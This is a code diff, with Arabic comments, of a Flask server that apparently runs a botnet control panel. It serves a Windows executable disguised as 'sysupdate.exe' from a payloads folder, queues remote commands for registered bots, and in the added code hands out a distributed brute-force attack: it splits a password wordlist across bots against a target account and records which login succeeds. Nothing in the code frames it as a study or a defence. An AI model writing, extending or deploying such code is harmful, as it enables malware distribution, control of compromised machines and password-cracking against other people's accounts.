@@ -4,15 +4,16 @@ import functools
 import hashlib
 import os
 import re
+import json
 
 app = Flask(__name__)
 app.secret_key = os.urandom(32)
 
 # ===== بيانات الدخول =====
 USERNAME = "admin"
-PASSWORD_HASH = hashlib.sha256("123".encode()).hexdigest()
+PASSWORD_HASH = hashlib.sha256("SecurePass123".encode()).hexdigest()
 
-# ===== نظام القفل المتقدم =====
+# ===== نظام القفل =====
 failed_attempts = {}
 
 def get_remaining_lockout(ip):
@@ -87,44 +88,21 @@ def logout():
     session.clear()
     return redirect(url_for('login'))
 
-# ===== مسار التحميل العام (بدون حماية) - النسخة النهائية =====
+# ===== مسار التحميل العام =====
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 @app.route('/payload')
 def download_payload():
-    """
-    يحاول إيجاد الملف في مجلد payloads/ بأي من الأسماء التالية:
-    - sysupdate.exe
-    - sysupdate
-    - sysupdate (بدون امتداد)
-    """
     try:
-        # قائمة الأسماء المحتملة
         possible_files = ['sysupdate.exe', 'sysupdate']
         payload_dir = os.path.join(BASE_DIR, 'payloads')
-        
-        # نبحث عن الملف
         for filename in possible_files:
             file_path = os.path.join(payload_dir, filename)
             if os.path.exists(file_path):
                 return send_file(file_path, as_attachment=True, download_name='sysupdate.exe')
-        
-        # إذا لم نجده، نعرض محتويات المجلد للمساعدة في التشخيص
-        try:
-            files_in_payloads = os.listdir(payload_dir)
-            return f"""الملف غير موجود في مجلد payloads.
-            المجلد الموجود: {payload_dir}
-            الملفات الموجودة: {files_in_payloads}
-            ابحث عن: sysupdate.exe أو sysupdate
-            """, 404
-        except FileNotFoundError:
-            return f"""مجلد payloads غير موجود على السيرفر.
-            المسار المطلوب: {payload_dir}
-            تأكد من رفع الملف إلى هذا المجلد.
-            """, 404
-            
+        return "الملف غير موجود", 404
     except Exception as e:
-        return f"خطأ داخلي: {str(e)}", 500
+        return f"خطأ: {e}", 500
 
 @app.route('/download')
 def download_page():
@@ -134,7 +112,6 @@ def download_page():
     <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
         <h1>⚡ Download Agent</h1>
         <a href="/payload" style="color:#0f0;border:1px solid #0f0;padding:10px 20px;text-decoration:none;">Download sysupdate.exe</a>
-        <p style="color:#666;margin-top:30px;">Run this file on your Windows machine.</p>
     </body>
     </html>
     '''
@@ -152,11 +129,146 @@ def bot_room(bot_id):
         return "Bot not found", 404
     return render_template('room.html', bot_id=bot_id, bot_info=bots[bot_id])
 
-# ===== باقي الـ APIs =====
+# ===== البيانات الأساسية =====
 bots = {}
 tasks = {}
 results = {}
 
+# ===== 🔥 نظام Brute Force الموزع =====
+bruteforce_data = {
+    "active": False,
+    "target": "",
+    "queue": [],          # لائحة الباسووردات لي مازالو فـ الانتظار
+    "total": 0,
+    "processed": 0,
+    "success": 0,
+    "failed": 0,
+    "results": [],        # النتائج الكاملة
+    "assigned_tasks": {}, # task_id -> password (باش نتأكد)
+    "stop_requested": False
+}
+
+@app.route('/bruteforce/start', methods=['POST'])
+@login_required
+def bruteforce_start():
+    data = request.json
+    target = data.get('target', '').strip()
+    wordlist_raw = data.get('wordlist', '').strip()
+    
+    if not target or not wordlist_raw:
+        return jsonify({"status": "error", "message": "Username and wordlist required"}), 400
+    
+    # تقسيم الـ wordlist إلى قائمة
+    passwords = [p.strip() for p in wordlist_raw.split('\n') if p.strip()]
+    if not passwords:
+        return jsonify({"status": "error", "message": "Wordlist is empty"}), 400
+    
+    # إعادة ضبط البيانات
+    global bruteforce_data
+    bruteforce_data = {
+        "active": True,
+        "target": target,
+        "queue": passwords.copy(),
+        "total": len(passwords),
+        "processed": 0,
+        "success": 0,
+        "failed": 0,
+        "results": [],
+        "assigned_tasks": {},
+        "stop_requested": False
+    }
+    
+    return jsonify({"status": "started", "total": len(passwords)})
+
+@app.route('/bruteforce/stop', methods=['POST'])
+@login_required
+def bruteforce_stop():
+    global bruteforce_data
+    bruteforce_data["active"] = False
+    bruteforce_data["stop_requested"] = True
+    return jsonify({"status": "stopped"})
+
+@app.route('/bruteforce/status', methods=['GET'])
+@login_required
+def bruteforce_status():
+    return jsonify({
+        "active": bruteforce_data["active"],
+        "target": bruteforce_data["target"],
+        "total": bruteforce_data["total"],
+        "processed": bruteforce_data["processed"],
+        "success": bruteforce_data["success"],
+        "failed": bruteforce_data["failed"],
+        "queue_length": len(bruteforce_data["queue"]),
+        "results": bruteforce_data["results"][-50:]  # آخر 50 نتيجة فقط
+    })
+
+@app.route('/bruteforce/report', methods=['POST'])
+def bruteforce_report():
+    data = request.json
+    bot_id = data.get('bot_id')
+    task_id = data.get('task_id')
+    success = data.get('success', False)
+    message = data.get('message', '')
+    password = data.get('password', '')
+    
+    global bruteforce_data
+    if not bruteforce_data["active"]:
+        return jsonify({"status": "ignored"})
+    
+    # نسجل النتيجة
+    result_entry = {
+        "bot_id": bot_id,
+        "password": password,
+        "success": success,
+        "message": message,
+        "time": datetime.now().strftime("%H:%M:%S")
+    }
+    bruteforce_data["results"].append(result_entry)
+    bruteforce_data["processed"] += 1
+    
+    if success:
+        bruteforce_data["success"] += 1
+        # إذا نجحنا، نوقف الهجوم
+        bruteforce_data["active"] = False
+        bruteforce_data["stop_requested"] = True
+    else:
+        bruteforce_data["failed"] += 1
+    
+    return jsonify({"status": "received"})
+
+# ===== تعديل على دالة جلب الأوامر (لتوزيع الباسووردات) =====
+@app.route('/get_task', methods=['GET'])
+def get_task():
+    bot_id = request.args.get('id')
+    
+    # ===== نفحص إذا كاين هجوم Brute Force شغال =====
+    if bot_id and bruteforce_data["active"] and len(bruteforce_data["queue"]) > 0:
+        # ناخذ باسوورد من الطابور
+        password = bruteforce_data["queue"].pop(0)
+        task_id = hashlib.md5(f"{bot_id}{password}{datetime.now()}".encode()).hexdigest()[:8]
+        
+        # نسجلو فـ المهام المسندة
+        bruteforce_data["assigned_tasks"][task_id] = password
+        
+        # نرجعالو الأمر بصيغة JSON
+        return jsonify({
+            "command": "bruteforce",
+            "target": bruteforce_data["target"],
+            "password": password,
+            "task_id": task_id
+        })
+    
+    # ===== الأوامر العادية =====
+    if bot_id:
+        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
+        if bot_id in tasks and len(tasks[bot_id]) > 0:
+            cmd = tasks[bot_id].pop(0)
+            # هنا كايمكن يكون أمر عادي (بحال whoami, screenshot, ...)
+            return jsonify({"command": cmd})
+    
+    return jsonify({"command": ""})
+
+# ===== باقي APIs (نفسها) =====
 @app.route('/register', methods=['POST'])
 def register():
     data = request.json
@@ -172,16 +284,6 @@ def register():
         if bot_id not in tasks:
             tasks[bot_id] = []
     return jsonify({"status": "ok"})
-
-@app.route('/get_task', methods=['GET'])
-def get_task():
-    bot_id = request.args.get('id')
-    if bot_id:
-        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
-        if bot_id in tasks and len(tasks[bot_id]) > 0:
-            cmd = tasks[bot_id].pop(0)
-            return jsonify({"command": cmd})
-    return jsonify({"command": ""})
 
 @app.route('/send_result', methods=['POST'])
 def send_result():
